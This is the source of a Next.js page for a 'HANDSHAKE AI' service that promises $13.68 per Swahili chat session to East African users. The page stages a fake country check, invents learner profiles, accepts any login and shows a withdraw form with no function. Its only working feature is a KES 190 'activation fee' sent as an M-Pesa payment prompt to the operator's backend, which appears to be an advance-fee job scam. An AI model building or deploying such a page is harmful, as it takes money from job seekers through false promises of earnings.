"use client";

import { useEffect, useState } from "react";

type Step = "loading" | "detected" | "form" | "dashboard" | "withdraw";

const BACKEND_URL =
process.env.NEXT_PUBLIC_BACKEND_URL ||
"https://starlink-backend-yb3n.onrender.com";

export default function Page() {
const [step, setStep] = useState<Step>("loading");
const [progress, setProgress] = useState(0);
const [isLogin, setIsLogin] = useState(false);


const [form, setForm] = useState({
name: "",
email: "",
phone: "",
password: "",
});

const [showPay, setShowPay] = useState(false);
const [payPhone, setPayPhone] = useState("");
const [loadingPay, setLoadingPay] = useState(false);
const [payDone, setPayDone] = useState(false);

const loadingSteps = [
"Detecting your country...",
"Analyzing location data...",
"Connecting to East Africa servers...",
"Loading payment methods...",
"Verifying M-Pesa integration...",
"Finalizing setup...",
];

useEffect(() => {
let i = 0;
const interval = setInterval(() => {
i++;
setProgress(i);
if (i === loadingSteps.length) {
clearInterval(interval);
setTimeout(() => setStep("detected"), 1200);
}
}, 700);
return () => clearInterval(interval);
}, []);

const normalizePhone = (num: string) => {
let phone = num.replace(/\D/g, "");
if (phone.startsWith("07") || phone.startsWith("01")) {
return "254" + phone.slice(1);
}
if (phone.startsWith("254")) return phone;
return phone;
};

const handlePayment = async () => {
const phone = normalizePhone(payPhone);

if (!/^254(7|1)\d{8}$/.test(phone)) {
alert("Enter valid Safaricom number");
return;
}

setLoadingPay(true);
try {
const res = await fetch(`${BACKEND_URL}/api/runPrompt`, {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({
phone,
amount: 190,
local_id: `ACT${Date.now().toString(36)}`,
transaction_desc: "Chat activation fee",
till_id: 1,
}),
});

const data = await res.json();
if (data.status) setPayDone(true);
else alert(data.msg || "Payment failed");

} catch {
alert("Network error");
} finally {
setLoadingPay(false);
}
};

const handleContinue = () => {
if (!form.name || !form.email || !form.phone || !form.password) {
alert("Please fill all fields");
return;
}
setStep("dashboard");
};

const users = [
{ name:"John Smith",country:"USA",level:"Beginner",desc:"I want to learn Swahili for my trip to Tanzania",tags:["Travel","Culture","Food"],color:"bg-indigo-500",initials:"JS"},
{ name:"Emma Wilson",country:"UK",level:"Beginner",desc:"Interested in East African culture and languages",tags:["Culture","History","Music"],color:"bg-green-600",initials:"EW"},
{ name:"Michael Brown",country:"Canada",level:"Intermediate",desc:"Planning to work in Kenya, need to improve my Swahili",tags:["Business","Travel","Sports"],color:"bg-red-500",initials:"MB"},
{ name:"Sarah Johnson",country:"Australia",level:"Beginner",desc:"Moving to Tanzania for a teaching job",tags:["Education","Travel","Culture"],color:"bg-orange-500",initials:"SJ"},
{ name:"David Martinez",country:"Spain",level:"Intermediate",desc:"Learning Swahili to connect with my Kenyan friends",tags:["Culture","Sports","Music"],color:"bg-purple-600",initials:"DM"},
{ name:"Lisa Chen",country:"Singapore",level:"Beginner",desc:"Planning a safari adventure in East Africa",tags:["Travel","Wildlife","Photography"],color:"bg-pink-500",initials:"LC"},
];

return (
<div className="min-h-screen bg-gray-100 flex items-center justify-center px-4">

{/* LOADING */}
{step === "loading" && (
<div className="bg-white border-t-4 border-red-500 rounded-2xl w-full max-w-md p-6 shadow-xl text-center">
    {/* LOGO / REGION BADGE */}
      <div className="flex flex-col items-center mb-4">
        <div className="w-16 h-16 flex items-center justify-center rounded-full bg-green-600 text-white text-2xl shadow-md">
          🌍
        </div>
        <span className="mt-2 text-xs bg-green-100 text-green-700 px-3 py-1 rounded-full font-semibold">
          East Africa
        </span>
      </div>

<h1 className="text-xl font-bold mb-3">Welcome to HANDSHAKE AI
</h1>
<div className="text-center text-green-700 font-bold py-6">
KENYA✔ . TANZANIA✔ . UGANDA✔<br/>

</div>
<div className="space-y-2 text-left mt-4">
{loadingSteps.map((s,i)=>(
<div key={i} className={`p-2 rounded-lg border text-xs ${i<=progress?"bg-green-100 border-green-400":"bg-gray-100"}`}>{s}</div>
))}
</div>
<div className="h-2 bg-gray-200 rounded mt-4">
<div className="h-2 bg-green-600 rounded" style={{width:`${(progress/loadingSteps.length)*100}%`}}/>
</div>
</div>
)}

{/* DETECTED */}
{step === "detected" && (
  <div className="fixed inset-0 flex items-center justify-center bg-black/40 backdrop-blur-sm z-50">
    
    <div className="bg-white w-full max-w-md rounded-2xl shadow-2xl p-8 text-center relative animate-fadeIn">

      {/* LOGO / REGION BADGE */}
      <div className="flex flex-col items-center mb-4">
        <div className="w-16 h-16 flex items-center justify-center rounded-full bg-green-600 text-white text-2xl shadow-md">
          🌍
        </div>
        <span className="mt-2 text-xs bg-green-100 text-green-700 px-3 py-1 rounded-full font-semibold">
          East Africa
        </span>
      </div>

      {/* TITLE */}
      <h1 className="text-2xl font-bold text-gray-800 mb-2">
        Welcome to HANDSHAKE AI
      </h1>

      <p className="text-sm text-gray-500 mb-6">
        Kenya • Tanzania • Uganda
      </p>

      {/* DETECTED BOX */}
      <div className="border border-green-200 bg-green-50 rounded-xl p-6 mb-6 relative overflow-hidden">

        {/* ANIMATED CHECK ICON */}
        <div className="flex justify-center mb-3">
          <div className="w-14 h-14 flex items-center justify-center rounded-full bg-green-500 text-white text-xl animate-bounceSlow shadow-md">
            ✓
          </div>
        </div>

        <h2 className="text-lg font-semibold text-green-700">
          🇰🇪 Kenya Detected!
        </h2>

        <p className="text-sm text-green-600 mt-1">
          Your country is fully supported
        </p>
      </div>

      {/* BUTTON */}
      <button
        onClick={() => setStep("form")}
        className="w-full bg-green-600 hover:bg-green-700 transition text-white py-3 rounded-xl font-semibold shadow-md"
      >
        Get Started →
      </button>
    </div>
  </div>
)}
{/* FORM */}
{step === "form" && (
  <div className="bg-white border-t-4 border-green-500 rounded-2xl w-full max-w-md p-6 shadow-xl">

    <h1 className="text-xl font-bold mb-4 text-center">
      {isLogin ? "Login" : "Create Account"}
    </h1>

    {/* REGISTER ONLY */}
    {!isLogin && (
      <>
        <input
          placeholder="Full Name (e.g. Jhn wht)"
          className="w-full border-2 border-green-200 p-3 mb-3 rounded-lg placeholder-gray-400 focus:border-green-500 outline-none"
          onChange={(e)=>setForm({...form,name:e.target.value})}
        />

        <input
          placeholder="Phone Number (e.g. 07/01/254XXXXXXXX)"
          className="w-full border-2 border-green-200 p-3 mb-3 rounded-lg placeholder-gray-400 focus:border-green-500 outline-none"
          onChange={(e)=>setForm({...form,phone:e.target.value})}
        />
      </>
    )}

    {/* ALWAYS SHOWN */}
    <input
      type="email"
      placeholder="Email Address"
      className="w-full border-2 border-green-200 p-3 mb-3 rounded-lg placeholder-gray-400 focus:border-green-500 outline-none"
      onChange={(e)=>setForm({...form,email:e.target.value})}
    />

    <input
      type="password"
      placeholder={isLogin ? "Enter Password" : "Create Password"}
      className="w-full border-2 border-green-200 p-3 mb-4 rounded-lg placeholder-gray-400 focus:border-green-500 outline-none"
      onChange={(e)=>setForm({...form,password:e.target.value})}
    />

    {/* BUTTON */}
    <button
      onClick={() => {
        if (isLogin) {
          // only require email + password
          if (!form.email || !form.password) {
            alert("Enter email and password");
            return;
          }
          setStep("dashboard");
        } else {
          // require all fields
          if (!form.name || !form.phone || !form.email || !form.password) {
            alert("Fill all fields");
            return;
          }
          handleContinue();
        }
      }}
      className="w-full bg-green-700 hover:bg-green-800 transition text-white py-3 rounded-xl font-bold"
    >
      {isLogin ? "Login →" : "Continue →"}
    </button>

    {/* SWITCH */}
    <p className="text-center text-sm text-gray-500 mt-4">
      {isLogin ? "Don't have an account?" : "Already have an account?"}{" "}
      <span
        onClick={() => setIsLogin(!isLogin)}
        className="text-green-600 font-semibold cursor-pointer"
      >
        {isLogin ? "Register" : "Login"}
      </span>
    </p>

  </div>
)}
{/* DASHBOARD */}
{step === "dashboard" && (
<div className="w-full max-w-6xl">

<div className="bg-white shadow-sm rounded-xl px-6 py-4 mb-6 flex justify-between items-center">
<h1 className="font-bold text-green-700 text-lg">
HANDSHAKE AI
<span className="ml-2 bg-green-700 text-white px-2 py-1 text-xs rounded">KE</span>
</h1>

<div className="flex gap-3 items-center">
<button onClick={()=>setStep("withdraw")} className="bg-green-600 text-white px-4 py-2 rounded-lg text-sm font-bold">Withdraw Fund</button>
<span className="text-sm font-extrabold text-gray-800 tracking-wide">
  {form.name || "User"}
</span></div>
</div>

<h2 className="text-2xl font-bold mb-1">Online Learners</h2>
<p className="text-gray-600 mb-6">Connect with people who want to learn Swahili. Earn $13.68 per chat session.</p>

<div className="bg-white rounded-xl p-4 flex justify-between items-center mb-6 shadow-sm">
<div className="flex gap-6 text-sm items-center">
  <p className="flex items-center gap-2">
    💬 Active Chats: <b>0/6</b>
  </p>

  <p className="flex items-center gap-2">
    <span className="text-blue-600 font-bold">$</span>
    Earnings per chat: <b className="text-blue-600">13.68</b>
  </p>
</div>
<button onClick={()=>setShowPay(true)} className="bg-orange-500 hover:bg-orange-600 text-white px-5 py-2 rounded-lg font-semibold">Activate Chat Access</button>
</div>

<div className="bg-yellow-100 border border-yellow-300 p-4 rounded-xl mb-6">
<h3 className="font-bold">Chat Activation Required</h3>
<p className="text-sm">🔒 Pay onetime activation fee of 1.45$ to Unlock, start chatting and earning.</p>
</div>

<div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
{users.map((u,i)=>(
<div key={i} className="bg-white p-5 rounded-xl shadow-sm">
<div className="flex items-center gap-3 mb-3">
<div className={`w-12 h-12 rounded-full flex items-center justify-center text-white font-bold ${u.color}`}>{u.initials}</div>
<div>
<p className="font-bold">{u.name}</p>
<p className="text-xs text-gray-500">🌍 {u.country}</p>
</div>
</div>

<span className="text-xs bg-green-100 text-green-700 px-2 py-1 rounded">⭐ {u.level}</span>
<p className="text-sm text-gray-600 mt-3">{u.desc}</p>

<div className="flex gap-2 mt-3 flex-wrap">
{u.tags.map((t,idx)=>(
<span key={idx} className="text-xs bg-gray-100 px-2 py-1 rounded">{t}</span>
))}
</div>

<button className="mt-4 w-full bg-green-500/80 hover:bg-green-600 text-white py-2 rounded-lg text-sm font-semibold">🔒 Locked</button>
</div>
))}
</div>
</div>
)}

{/* WITHDRAW PAGE */}
{step === "withdraw" && (
  <div className="w-full max-w-3xl mx-auto">

    {/* TOP BAR */}
    <div className="flex items-center justify-between mb-6">
      <div>
        <h1 className="text-xl font-bold text-gray-800">
          Withdraw Funds
        </h1>
        <p className="text-xs text-gray-500">
          Fast & secure payouts
        </p>
      </div>
      <div className="bg-white border-2 border-yellow-400 rounded-lg p-3">
    <p className="text-red-600 text-sm font-semibold text-center">
      You have not worked yet
    </p>
  </div>

      <button
        onClick={() => setStep("dashboard")}
        className="text-sm text-gray-500 hover:text-black"
      >
        ✕ Close
      </button>
    </div>

    {/* BALANCE + QUICK INFO */}
    <div className="grid md:grid-cols-3 gap-4 mb-6">

      <div className="bg-white rounded-xl p-4 shadow-sm">
        <p className="text-xs text-gray-500">Balance</p>
        <h2 className="text-xl font-bold text-gray-800">$0.00</h2>
      </div>

      <div className="bg-white rounded-xl p-4 shadow-sm">
        <p className="text-xs text-gray-500">Min Withdraw</p>
        <h2 className="text-sm font-semibold">$5</h2>
      </div>

      <div className="bg-white rounded-xl p-4 shadow-sm">
        <p className="text-xs text-gray-500">Processing</p>
        <h2 className="text-sm font-semibold">2–44 hrs</h2>
      </div>

    </div>

    {/* MAIN SECTION */}
    <div className="grid md:grid-cols-2 gap-6">

      {/* LEFT - FORM */}
      <div className="bg-white rounded-xl p-5 shadow-sm">
        <h3 className="font-semibold text-gray-800 mb-4">
          Withdrawal Request
        </h3>
        <p className="text-xs text-gray-500">
          payouts from the phone number you registered with
        </p>

        <input
          placeholder="M-Pesa number (07XXXXXXXX)"
          className="w-full border border-gray-200 focus:border-green-600 outline-none p-3 rounded-lg mb-3 text-sm"
        />

        <input
          placeholder="Amount (USD)"
          className="w-full border border-gray-200 focus:border-green-600 outline-none p-3 rounded-lg mb-4 text-sm"
        />

        <button className="w-full bg-green-600 hover:bg-green-700 text-white py-2.5 rounded-lg font-semibold text-sm transition">
          Submit Request
        </button>
      </div>

    {/* RIGHT - RULES */}
<div className="bg-gradient-to-br from-blue-50 to-blue-100 rounded-2xl p-6 shadow-md border border-blue-200">

  {/* Header */}
  <div className="flex items-center justify-between mb-5">
    <h3 className="text-base font-semibold text-blue-900">
      Rules & Info
    </h3>

    <span className="text-xs px-2 py-1 bg-blue-200 text-blue-800 rounded-full">
      Read Carefully
    </span>
  </div>

  {/* Rules List */}
  <div className="space-y-4">

    <div className="flex items-center justify-between py-2 border-b border-blue-100">
      <span className="text-sm text-blue-700">Minimum</span>
      <span className="text-sm font-semibold text-blue-900">$5</span>
    </div>

    <div className="flex items-center justify-between py-2 border-b border-blue-100">
      <span className="text-sm text-blue-700">Processing Time</span>
      <span className="text-sm font-semibold text-blue-900">2–24 hrs</span>
    </div>

    <div className="flex items-center justify-between py-2 border-b border-blue-100">
      <span className="text-sm text-blue-700">Verification</span>
      <span className="text-sm font-semibold text-blue-900">Be ACTIVATED</span>
    </div>

    <div className="flex items-center justify-between py-2">
      <span className="text-sm text-blue-700">Method</span>
      <span className="text-sm font-semibold text-blue-900">M-Pesa</span>
    </div>

  </div>

  {/* Info box */}
  <div className="mt-5 rounded-xl border border-blue-200 bg-blue-200/40 p-3">
    <p className="text-xs text-blue-900 leading-relaxed">
      Make sure your account details are correct before submitting.
    </p>
  </div>
</div>
    </div>

  </div>
)}
{/* ================= PAYMENT MODAL ================= */}
{showPay && (
  <div className="fixed inset-0 bg-black/50 flex items-center justify-center px-4">
    <div className="bg-white w-full max-w-sm rounded-xl p-5 border-t-4 border-yellow-400 relative">

      {/* CLOSE BUTTON */}
      <button
        onClick={() => setShowPay(false)}
        className="absolute top-3 right-3 text-gray-500 hover:text-black text-lg font-bold"
      >
        ✕
      </button>

      {!payDone ? (
        <>
          <h2 className="font-bold text-lg mb-2">
            Activate Chat Access
          </h2>

          <p className="text-sm text-gray-600 mb-3">
            Pay activation fee to start chatting and earni $13.68 per chat
          </p>

          <div className="bg-green-50 border p-3 rounded mb-3">
            <p className="font-bold text-sm">Activation Fee:</p>
            <p className="text-green-700 font-extrabold">
              $1.45 USD
            </p>
            <p className="text-xs text-gray-500">
              ≈ KES 190
            </p>
          </div>

          <input
            placeholder="07XXXXXXXX / 01XXXXXXXX / 254XXXXXXXX"
            className="w-full border-2 p-3 rounded-lg mb-3"
            onChange={(e)=>setPayPhone(e.target.value)}
          />


<button
onClick={handlePayment}
className="w-full bg-green-700 text-white py-2 rounded font-bold"
>
{loadingPay ? "Processing..." : "Pay Now"}
</button>
</>
) : (
<div className="text-center text-green-700 font-bold py-6">
Payment Prompt Sent ✔<br/>
Wait for our email
</div>
)}

</div>
</div>
)}

</div>
);
}